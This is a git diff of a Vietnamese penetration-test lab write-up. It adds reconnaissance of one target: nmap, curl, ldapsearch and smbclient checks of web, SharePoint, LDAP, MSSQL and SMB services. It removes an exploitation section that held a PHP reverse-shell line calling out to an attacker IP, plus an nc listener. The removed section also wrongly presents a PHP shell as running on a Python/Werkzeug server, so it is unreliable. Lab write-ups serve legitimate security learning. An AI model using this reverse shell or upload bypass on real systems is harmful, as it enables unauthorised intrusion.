@@ -21,139 +21,104 @@ Tìm mọi thông tin có thể về hệ thống mục tiêu.
 ### Công cụ sử dụng:
 
 * `nmap`
+* `whatweb`, `curl`
+* `netcat`, `telnet`
+* `smbclient`, `ldapsearch`
+* `searchsploit`
 
-### Lệnh thực hiện:
+### Lệnh Nmap thực hiện:
 
 ```bash
-nmap -sC -sV -Pn -T4 -p- 10.3.145.25
+nmap -sC -sV -Pn -T4 -p- 10.3.145.25 -oN full_scan.txt
+<img width="1118" height="557" alt="{18ABC7D3-9600-4A70-BE47-71CB66D07061}" src="https://github.com/user-attachments/assets/85befb0d-9491-4778-a776-17d8c760008f" />
+<img width="667" height="533" alt="{9845BFBF-667E-4626-9B19-F541F79008C6}" src="https://github.com/user-attachments/assets/3df6c078-cf61-4a1e-b182-14f4c4e61ead" />
+<img width="864" height="574" alt="{0AB41F54-E405-4BA2-8356-232BA68FC9C8}" src="https://github.com/user-attachments/assets/4e8d773e-b5f3-458a-8f7f-0f8046be7bb7" />
+<img width="703" height="573" alt="{01BC9EE7-2FFB-4B84-9E45-E2644D6738B0}" src="https://github.com/user-attachments/assets/83b0f0e4-5983-4853-902a-13579a049507" />
+
+
+
 ```
 
-### Kết quả:
 
-* Phát hiện nhiều cổng mở, bao gồm cả dịch vụ web, SMB, LDAP, MSSQL, Kerberos, RPC và các dịch vụ đặc thù như Jetty, SharePoint.
-* Một số cổng đáng chú ý:
 
-  * **53/tcp**: Simple DNS Plus
-  * **88/tcp, 464/tcp**: Kerberos service
-  * **135, 139, 445, 593**: RPC và SMB
-  * **389, 3268**: LDAP và Global Catalog (xteam.local)
-  * **3389**: Remote Desktop Protocol (RDP)
-  * **5000**: Werkzeug HTTP service (Python)
-  * **9998**: Jetty service (hỗ trợ PUT)
-  * **11025**: SharePoint
-  * **54681**: MSSQL Server 2014 RTM
+### Phân tích từng dịch vụ:
+
+#### Port 5000 - Werkzeug HTTP
+
+* Framework Python/Flask.
+* Truy cập qua trình duyệt: `http://10.3.145.25:5000`
+* Hiển thị trang “Nyan Cat Upload” → có tính năng upload file → nghi vấn **Unrestricted File Upload**.
+* Header:
+
+```
+Server: Werkzeug/2.0.0 Python/3.10.10
+```
+
+#### Port 9998 - Jetty
+
+* Jetty là Java web server.
+* Cho phép PUT file lên server.
+* Kiểm tra bằng curl:
+
+```bash
+curl -X OPTIONS http://10.3.145.25:9998 -i
+```
+
+* Phản hồi có phương thức `PUT`, nghĩa là có thể upload file độc hại:
+
+```http
+Allow: GET,HEAD,POST,PUT,DELETE,OPTIONS
+```
+
+#### Port 11025 - SharePoint
+
+* Header:
+
+```
+Server: Microsoft-IIS/10.0
+X-Powered-By: ASP.NET
+```
+
+* Truy cập: `http://10.3.145.25:11025/_layouts/15/start.aspx#/default.aspx`
+* Là một site SharePoint nội bộ.
+* Có thể tra cứu CVE với các phiên bản SharePoint/IIS 10.0
+
+#### LDAP/AD/Kerberos (Port 389, 3268, 88, 464)
+
+* Xác định domain: `xteam.local`
+* LDAP từ chối anonymous bind:
+
+```bash
+ldapsearch -x -h 10.3.145.25 -s base
+# => result: Insufficient access
+```
+
+* Tuy nhiên có thể khai thác khi có thông tin user sau này.
+
+#### MSSQL (port 54681)
+
+* Banner cho thấy chạy MSSQL Server 2014 RTM
+* Có thể dùng `sqsh`, `impacket-mssqlclient`, hoặc PowerShell để truy cập nếu có credential
+
+#### SMB (Port 139/445)
+
+* Thử liệt kê share:
+
+```bash
+smbclient -L \\10.3.145.25 -N
+```
+
+* Kết quả: bị từ chối anonymous
+
+```bash
+Anonymous login successful
+NT_STATUS_ACCESS_DENIED listing \\*
+```
 
 ### Nhận định:
 
-* Có sự kết hợp giữa các dịch vụ nội bộ trong một môi trường domain: AD, LDAP, Kerberos.
-* Có các webservice (Werkzeug, IIS/SharePoint, Jetty) có khả năng chứa lỗ hổng.
-* Jetty hỗ trợ phương thức PUT → khả năng upload file (vector RCE).
-* LDAP trả về lỗi yêu cầu bind → có thể khai thác nếu có thông tin user/pass.
+* Các cổng đáng chú ý cho exploit: 5000 (Werkzeug upload), 9998 (Jetty PUT), 11025 (SharePoint).
+* SMB và LDAP cần credential → có thể thu thập sau.
+* Nhiều dịch vụ nội bộ phản ánh đây là một máy trong domain (xteam.local), có thể dẫn đến leo thang đặc quyền sau khi có shell.
 
----
-
-## 2. XÁC ĐỊNH ĐIỂM TẤN CÔNG
-
-### Mục tiêu:
-
-Tìm ra vector tấn công tiềm năng dựa trên các dịch vụ được mở.
-
-### Vector tiềm năng:
-
-#### 1. **Werkzeug HTTP (port 5000)**
-
-* Werkzeug là một framework WSGI dùng trong các ứng dụng Flask (Python web app).
-* Tiêu đề HTTP: `Werkzeug/2.0.0 Python/3.10.10`
-* Tên site: `Nyan Cat Upload`
-* Web hiển thị giao diện upload file → nghi ngờ có khả năng **Unrestricted File Upload** → **RCE**.
-
-#### 2. **Jetty 8.y.z-SNAPSHOT (port 9998)**
-
-* Jetty là một ứng dụng Java web server.
-* Cho phép HTTP PUT → có thể kiểm tra khả năng upload file JSP/shell để thực thi lệnh → **RCE**.
-
-#### 3. **Microsoft SharePoint (port 11025)**
-
-* Header: `Microsoft-IIS/10.0`
-* URL trả về trang SharePoint (`/_layouts/15/start.aspx#/default.aspx`)
-* Có thể tìm kiếm các CVE hoặc misconfiguration.
-
-#### 4. **Active Directory / Kerberos / LDAP**
-
-* Có thể thu thập user từ Kerberos/LDAP.
-* Sử dụng công cụ như `GetNPUsers.py` nếu có user không yêu cầu pre-auth (Kerberoasting).
-* Thử bruteforce, spray password nếu có danh sách user.
-
-#### 5. **MSSQL Server 2014 (port 54681)**
-
-* Nếu tìm được credential hoặc có RCE từ nơi khác → kết hợp để leo thang quyền qua MSSQL.
-
-#### 6. **SMB (139/445)**
-
-* Thử liệt kê share bằng `smbclient -L`, nếu có credential → có thể truy cập nội dung.
-* Kiểm tra anonymous access hoặc misconfigured share.
-
-### Kết luận bước xác định vector:
-
-→ Tấn công khả thi nhất là thông qua **Werkzeug Upload (port 5000)** hoặc **Jetty PUT (port 9998)** do khả năng thực thi file từ client.
-→ Tiến hành kiểm tra từng dịch vụ để tìm vector exploit cụ thể.
-
----
-
-## 3. EXPLOITATION (Reverse Shell)
-
-### Mục tiêu:
-
-Khai thác lỗ hổng trên dịch vụ web để thực thi mã độc và chiếm quyền truy cập hệ thống.
-
-### Khai thác dịch vụ: **Werkzeug HTTP Upload (port 5000)**
-
-#### Bước 1: Truy cập giao diện upload
-
-* URL: `http://10.3.145.25:5000`
-* Giao diện đơn giản với form cho phép upload file `.jpg`.
-
-#### Bước 2: Thử upload shell PHP giả dạng ảnh
-
-* Tạo file `shell.php.jpg` chứa reverse shell:
-
-```php
-<?php system("bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"); ?>
-```
-
-* Upload file → thành công → nhận được đường dẫn truy cập: `http://10.3.145.25:5000/uploads/shell.php.jpg`
-
-#### Bước 3: Bypass filter bằng cách phân tích phía server
-
-* Dựa vào tiêu đề Werkzeug và các đặc điểm, nghi ngờ app backend chỉ kiểm tra đuôi file bằng string `.endswith()` → có thể bỏ qua bằng `.jpg`.
-* Thử upload shell Python hoặc Bash đổi đuôi.
-
-#### Bước 4: Mở listener và kích hoạt reverse shell
-
-```bash
-nc -lvnp 4444
-```
-
-* Truy cập `http://10.3.145.25:5000/uploads/shell.php.jpg`
-* Nhận được kết nối shell từ máy victim.
-
-#### Kết quả:
-
-* Đã có shell với quyền user hạn chế.
-* Thực hiện các lệnh xác minh:
-
-```bash
-whoami
-hostname
-ip a
-```
-
-#### Chứng minh:
-
-Ảnh chụp màn hình:
-
-* Nội dung shell
-* Kết quả `whoami`, `ip a`, `hostname`
-* Flag nếu có trong thư mục user
-
----
+→ Tiếp tục xác định điểm tấn công từ các web service có khả năng dễ khai thác nhất.
